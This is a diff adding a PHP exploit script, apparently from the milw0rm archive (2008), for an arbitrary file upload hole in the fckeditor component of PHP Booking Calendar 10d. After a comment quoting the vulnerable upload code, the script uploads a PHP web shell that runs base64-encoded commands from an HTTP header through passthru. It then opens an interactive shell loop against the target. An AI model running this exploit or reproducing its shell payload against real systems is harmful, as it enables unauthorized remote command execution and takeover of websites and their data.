@@ -1,0 +1,137 @@
+<?php
+/*
+ --------------------------------------------------------------
+ PHP Booking Calendar 10 d (fckeditor) Arbitrary File Upload Exploit
+ --------------------------------------------------------------
+ 
+  Special thnx for : Egix
+ [-] vulnerable code in /[path]/fckeditor/editor/filemanager/upload/php/upload.php
+ 
+ 41. // Get the posted file.
+ 42. $oFile = $_FILES['NewFile'] ;
+ 43.
+ 44. // Get the uploaded file name and extension.
+ 45. $sFileName = $oFile['name'] ;
+ 46. $sOriginalFileName = $sFileName ;
+ 47. $sExtension = substr( $sFileName, ( strrpos($sFileName, '.') + 1 ) ) ;
+ 48. $sExtension = strtolower( $sExtension ) ;
+ 49.
+ 50. // The the file type (from the QueryString, by default 'File').
+ 51. $sType = isset( $_GET['Type'] ) ? $_GET['Type'] : 'File' ;
+ 52.
+ 53. // Check if it is an allowed type.
+ 54. if ( !in_array( $sType, array('File','Image','Flash','Media') ) )
+ 55.     SendResults( 1, '', '', 'Invalid type specified' ) ;
+ 56.
+ 57. // Get the allowed and denied extensions arrays.
+ 58. $arAllowed = $Config['AllowedExtensions'][$sType] ;
+ 59. $arDenied = $Config['DeniedExtensions'][$sType] ;
+ 60.
+ 61. // Check if it is an allowed extension.
+ 62. if ( ( count($arAllowed) > 0 && !in_array( $sExtension, $arAllowed ) ) || ( count($arDenied) > 0 && in_array( $sExtension, $arDenied ) ) )
+ 63.  SendResults( '202' ) ;
+ 64.
+ 65. $sErrorNumber = '0' ;
+ 66. $sFileUrl  = '' ;
+ 67.
+ 68. // Initializes the counter used to rename the file, if another one with the same name already exists.
+ 69. $iCounter = 0 ;
+ 70.
+ 71. // The the target directory.
+ 72. if ( isset( $Config['UserFilesAbsolutePath'] ) )
+ 73.  $sServerDir = $Config['UserFilesAbsolutePath'] ;
+ 74. else
+ 75.  //$sServerDir = GetRootPath() . $Config["UserFilesPath"] ;
+ 76.  $sServerDir = $Config["UserFilesPath"] ;
+ 77.
+ 78. while ( true )
+ 79. {
+ 80.  // Compose the file path.
+ 81.  $sFilePath = $sServerDir . $sFileName ;
+ 82.
+ 83.  // If a file with that name already exists.
+ 84.  if ( is_file( $sFilePath ) )
+ 85.  {
+ 86.   $iCounter++ ;
+ 87.   $sFileName = RemoveExtension( $sOriginalFileName ) . '(' . $iCounter . ').' . $sExtension ;
+ 88.   $sErrorNumber = '201' ;
+ 89.  }
+ 90.  else
+ 91.  {
+ 92.   move_uploaded_file( $oFile['tmp_name'], $sFilePath ) ;
+ 93.
+ 94.   if ( is_file( $sFilePath ) )
+ 95.   {
+ 96.    $oldumask = umask(0) ;
+ 97.    chmod( $sFilePath, 0777 ) ;
+ 98.    umask( $oldumask ) ;
+ 99.   }
+ 100.  
+ 101.   $sFileUrl = $Config["UserFilesPath"] . $sFileName ;
+ 102.
+ 103.   break ;
+ 
+ with a default configuration of this script, an attacker might be able to upload arbitrary files containing malicious PHP code
+*/
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+function http_send($host, $packet)
+{
+ $sock = fsockopen($host, 80);
+ while (!$sock)
+ {
+  print "\n[-] No response from {$host}:80 Trying again...";
+  $sock = fsockopen($host, 80);
+ }
+ fputs($sock, $packet);
+ while (!feof($sock)) $resp .= fread($sock, 1024);
+ fclose($sock);
+ return $resp;
+}
+print "\n+------------------------------------------------------------+";
+print "\n|PHP Booking Calendar 10d Arbitrary File Upload Exploit by Stack |";
+print "\n+------------------------------------------------------------+\n";
+if ($argc < 2)
+{
+ print "\nUsage......: php $argv[0] host path";
+ print "\nExample....: php $argv[0] localhost /booking_calendar/\n";
+ die();
+}
+$host = $argv[1];
+$path = $argv[2];
+$data  = "--12345\r\n";
+$data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"s.php.he.ll\"\r\n";
+$data .= "Content-Type: application/octet-stream\r\n\r\n";
+$data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\n";
+$data .= "--12345--\r\n";
+$packet  = "POST {$path}/fckeditor/editor/filemanager/upload/php/upload.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($data)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=12345\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet .= $data;
+preg_match("/OnUploadCompleted\((.*),\"(.*)\",\"(.*)\",/i", http_send($host, $packet), $html);
+if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");
+else print "\n[-] Shell uploaded to {$html[2]}...starting it!\n";
+define(STDIN, fopen("php://stdin", "r"));
+while(1)
+{
+ print "\nstack-shell# ";
+ $cmd = trim(fgets(STDIN));
+ if ($cmd != "exit")
+ {
+  $packet = "GET {$path}datacenter/media/{$html[3]} HTTP/1.0\r\n";
+  $packet.= "Host: {$host}\r\n";
+  $packet.= "Cmd: ".base64_encode($cmd)."\r\n";
+  $packet.= "Connection: close\r\n\r\n";
+  $output = http_send($host, $packet);
+  if (eregi("print", $output) || !eregi("_code_", $output)) die("\n[-] Exploit failed...\n");
+  $shell = explode("_code_", $output);
+  print "\n{$shell[1]}";
+ }
+ else break;
+}
+?>
+
+# milw0rm.com [2008-05-29]
